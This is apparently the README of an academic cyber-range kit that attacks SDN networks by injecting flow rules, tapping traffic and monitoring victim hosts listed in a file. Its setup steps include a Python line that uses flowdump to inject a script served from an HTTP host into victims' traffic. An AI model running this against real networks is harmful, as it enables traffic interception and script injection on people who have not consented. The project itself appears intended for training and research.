# SDNcybeRangeKit

A penetration testing and digital forensics environment 

**Warning: this [PRIVATE] project is for academic/research purposes only.**

A blog post about this project can be read here: http://www.ivanletteri.it/SDNcrKit

![SDNcyberRangeKit](https://www.ivanletteri.it/SDNcrKit/master/sdncrkit-logo-small.png "SDNcybeRangeKit")

## Concept
- Performs a SDN scenario attacks to all selected victims
- Injects SDN rules 
- Tapping the network
- All the devices victims connected to the Lan network, will be monitored for the SDNcybeRangeMonitor


## Use
- install.sh
```
bash install.sh
```
- edit hosts.txt with one IP per line
- edit controller.py, line 30, with the RyuControlleMiner httpserver IP:
```py
os.system("~/.local/bin/flowdump -s 'dump.py http://10.0.2.20:5600/script.js' -T")
```
- execute sdn-cyberange-kit.py
```
python3 sdn-cyberange-kit.py ipgateway
```

![network](https://www.ivanletteri.it/SDNcrKit/master/SDNcybeRangeKit-network-attack.png "network")


A complete instructions for academic scenario can be found in https://github.com/IvanLetteri/SDNcybeRangeKit/blob/master/virtualbox_scenario_instructions.md



![demo](https://www.ivanletteri.it/SDNcrKit/master/SDNcybeRangeKit-demo-cutted.gif "demo")
